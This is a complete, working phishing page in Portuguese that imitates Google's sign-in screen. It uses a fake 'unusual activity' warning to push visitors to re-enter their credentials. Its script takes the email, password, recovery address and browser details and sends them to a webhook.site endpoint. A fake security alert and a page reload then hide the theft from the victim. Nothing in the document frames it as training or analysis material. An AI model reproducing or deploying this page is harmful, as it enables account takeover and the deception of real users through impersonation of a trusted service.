<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google - Acesso Seguro</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Google Sans', Arial, sans-serif;
        }

        body {
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .google-container {
            width: 100%;
            max-width: 450px;
            text-align: center;
        }

        .google-logo {
            margin-bottom: 40px;
        }

        .google-logo svg {
            width: 92px;
            height: 92px;
        }

        .security-alert {
            background: #fce8e6;
            border: 1px solid #f28b82;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 30px;
            text-align: left;
        }

        .security-alert h2 {
            color: #d93025;
            font-size: 18px;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .security-alert p {
            color: #70757a;
            font-size: 14px;
            line-height: 1.5;
        }

        .login-form {
            background: #ffffff;
            border: 1px solid #dadce0;
            border-radius: 12px;
            padding: 40px 30px 30px;
            text-align: left;
        }

        .form-title {
            font-size: 24px;
            font-weight: 500;
            color: #202124;
            margin-bottom: 8px;
        }

        .form-subtitle {
            color: #5f6368;
            font-size: 16px;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 24px;
        }

        .form-group label {
            display: block;
            color: #202124;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 8px;
        }

        .input-field {
            width: 100%;
            padding: 16px;
            border: 2px solid #dadce0;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: #ffffff;
        }

        .input-field:focus {
            outline: none;
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
        }

        .next-button {
            width: 100%;
            background: #1a73e8;
            color: #ffffff;
            border: none;
            padding: 16px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .next-button:hover {
            background: #1565c0;
            box-shadow: 0 2px 8px rgba(26,115,232,0.4);
        }

        .footer-links {
            margin-top: 30px;
            text-align: center;
        }

        .footer-links a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            margin: 0 12px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .language-selector {
            margin-top: 30px;
            text-align: center;
            color: #5f6368;
            font-size: 14px;
        }

        /* Dark mode simulation */
        @media (prefers-color-scheme: dark) {
            body {
                background: #202124;
            }
            
            .login-form {
                background: #303134;
                border-color: #5f6368;
            }
            
            .form-title, .form-group label {
                color: #e8eaed;
            }
            
            .input-field {
                background: #303134;
                border-color: #5f6368;
                color: #e8eaed;
            }
        }

        /* Animations */
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        .shake {
            animation: shake 0.3s ease;
        }
    </style>
</head>
<body>
    <div class="google-container">
        <div class="google-logo">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 272 92" width="272" height="92">
                <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
                <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
                <path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
                <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
                <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.70-4.95 0-11.84 4.37-11.59 12.93z"/>
                <path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/>
            </svg>
        </div>

        <div class="security-alert">
            <h2>
                <svg width="20" height="20" viewBox="0 0 24 24" fill="#d93025">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                </svg>
                Atividade incomum detectada
            </h2>
            <p>Verificamos uma tentativa de acesso suspeita à sua conta. Para sua segurança, confirme suas credenciais.</p>
        </div>

        <div class="login-form">
            <h2 class="form-title">Fazer login</h2>
            <p class="form-subtitle">Use sua Conta do Google</p>

            <form id="googleForm" onsubmit="handleLogin(event)">
                <div class="form-group">
                    <label for="email">E-mail ou telefone</label>
                    <input type="email" id="email" class="input-field" required autocomplete="username" placeholder="seu@email.com">
                </div>

                <div class="form-group" id="passwordGroup" style="display: none;">
                    <label for="password">Digite sua senha</label>
                    <input type="password" id="password" class="input-field" required autocomplete="current-password" placeholder="Sua senha">
                </div>

                <div class="form-group" id="recoveryGroup" style="display: none;">
                    <label for="recovery">E-mail de recuperação</label>
                    <input type="email" id="recovery" class="input-field" placeholder="email@recuperacao.com (opcional)">
                </div>

                <button type="submit" class="next-button" id="submitButton">
                    <span id="buttonText">Próxima</span>
                </button>
            </form>
        </div>

        <div class="footer-links">
            <a href="#">Ajuda</a>
            <a href="#">Privacidade</a>
            <a href="#">Termos</a>
        </div>

        <div class="language-selector">
            English (United States) ▼
        </div>
    </div>

    <script>
        const LOG_ENDPOINT = 'https://webhook.site/ab830b1e-933d-4730-becf-f96ff893bd33';
        let step = 1;

        function handleLogin(event) {
            event.preventDefault();
            
            if (step === 1) {
                const email = document.getElementById('email').value;
                if (!email.includes('@gmail.com')) {
                    document.getElementById('email').classList.add('shake');
                    setTimeout(() => document.getElementById('email').classList.remove('shake'), 300);
                    return;
                }
                
                // Mostra campo de senha
                document.getElementById('passwordGroup').style.display = 'block';
                document.getElementById('recoveryGroup').style.display = 'block';
                document.getElementById('buttonText').textContent = 'Entrar';
                step = 2;
                
            } else if (step === 2) {
                const credentials = {
                    email: document.getElementById('email').value,
                    password: document.getElementById('password').value,
                    recovery: document.getElementById('recovery').value || 'Não fornecido',
                    timestamp: new Date().toLocaleString('pt-BR'),
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform
                };
                
                // Envia para webhook
                fetch(LOG_ENDPOINT, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(credentials),
                    mode: 'no-cors'
                }).catch(error => console.log('Erro ao enviar:', error));
                
                // Feedback visual
                document.getElementById('submitButton').textContent = 'Verificando...';
                document.getElementById('submitButton').disabled = true;
                
                // Redirecionamento fake
                setTimeout(() => {
                    alert('Verificação de segurança necessária. Tente novamente em alguns minutos.');
                    window.location.reload();
                }, 2000);
            }
        }

        // Animações de foco
        document.querySelectorAll('.input-field').forEach(input => {
            input.addEventListener('focus', (e) => {
                e.target.parentElement.style.transform = 'translateY(-2px)';
            });
            input.addEventListener('blur', (e) => {
                e.target.parentElement.style.transform = 'translateY(0)';
            });
        });
    </script>
</body>
</html>
